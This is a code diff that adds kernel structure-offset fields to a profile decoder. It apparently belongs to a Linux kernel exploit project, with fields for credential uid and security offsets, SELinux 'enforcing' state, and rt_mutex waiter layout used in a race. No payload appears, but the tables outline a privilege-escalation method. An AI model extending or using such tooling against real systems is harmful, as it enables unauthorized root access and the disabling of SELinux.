@@ -84,6 +84,9 @@ namespace ghostlock::binary_profile {
             PLAIN("copy_size", credential.copy_size),
             PLAIN("usage_offset", credential.usage_offset),
             PLAIN("usage_value", credential.usage_value),
+            OPT("usage_size", credential.usage_size),
+            OPT("uid_offset", credential.uid_offset),
+            OPT("security_offset", credential.security_offset),
             PLAIN("caps_offset", credential.caps_offset),
             PLAIN("caps_count", credential.caps_count),
             PLAIN("caps_value", credential.caps_value),
@@ -117,6 +120,28 @@ namespace ghostlock::binary_profile {
             OPT("compact_waiter", misc.compact_waiter),
             OPT("kernelsnitch_collisions", misc.kernelsnitch_collisions),
             OPT("mm_struct_sz", misc.mm_struct_sz),
+            OPT("rt_mutex_size", misc.rt_mutex_size),
+        };
+
+        /* Page-free Stage 1: selinux_state's field offsets. Optional as a
+         * block -- absence keeps the release-derived layout. */
+        constexpr Field kSelinux[] = {
+            OPT("enforcing", selinux.enforcing),
+            OPT("initialized", selinux.initialized),
+        };
+
+        /* W1's scratch region (image offset). Absence keeps the reclaimed-page
+         * value, i.e. the pre-stage-1 behaviour. */
+        constexpr Field kW1Scratch[] = {
+            OPT("image", w1_scratch.image),
+        };
+
+        constexpr Field kWaiter[] = {
+            OPT("compact", waiter.compact),
+            OPT("pi_tree", waiter.pi_tree),
+            OPT("task", waiter.task),
+            OPT("lock", waiter.lock),
+            OPT("wake_state", waiter.wake_state),
         };
 
         constexpr Field kExecCpus[] = {
@@ -184,6 +209,12 @@ namespace ghostlock::binary_profile {
             /* Optional: absence keeps this build's 0x1000 / 0x20 grid. */
             OPT("lock_anchor_bytes", geometry.select_lock_anchor_bytes),
             OPT("lock_anchor_stride", geometry.select_lock_anchor_stride),
+            /* Optional: the AArch32 carrier. Absent/0 keeps the 64-bit route;
+             * the two geometry values are the measured strip home and compat
+             * select buffer depth (docs/analysis/compat-select-carrier-plan.md). */
+            OPT("compat_carrier", geometry.select_compat_carrier),
+            OPT("waiter_home", geometry.select_waiter_home),
+            OPT("select_dst_depth", geometry.select_select_dst_depth),
             PLAIN("enter_delay_us", execution.select_enter_delay_us),
             PLAIN("timeout_us", execution.select_timeout_us),
         };
@@ -193,6 +224,13 @@ namespace ghostlock::binary_profile {
             OPT("buffer_size", geometry.mcast_buffer_size),
             OPT("task_offset", geometry.mcast_task_offset),
             OPT("lock_offset", geometry.mcast_lock_offset),
+            /* The anchor trio is stated by this route's own section, for the
+             * same reason as the sigreturn route's below: the decoder never
+             * merges across routes. Optional, and absence keeps the
+             * reclaimed-page behaviour. */
+            OPT("lock_anchor_image", geometry.select_lock_anchor_image),
+            OPT("lock_anchor_bytes", geometry.select_lock_anchor_bytes),
+            OPT("lock_anchor_stride", geometry.select_lock_anchor_stride),
         };
 
         /* The sigreturn route's own section. The anchor trio is not duplicated
@@ -226,6 +264,9 @@ namespace ghostlock::binary_profile {
             {"cred", kCred, std::size(kCred)},
             {"offset", kOffset, std::size(kOffset)},
             {"kernel", kKernel, std::size(kKernel)},
+            {"selinux", kSelinux, std::size(kSelinux)},
+            {"w1_scratch", kW1Scratch, std::size(kW1Scratch)},
+            {"waiter_layout", kWaiter, std::size(kWaiter)},
             {"execution.recommended_cpus", kExecCpus, std::size(kExecCpus)},
             {"execution.heap", kExecHeap, std::size(kExecHeap)},
             {"execution.race", kExecRace, std::size(kExecRace)},
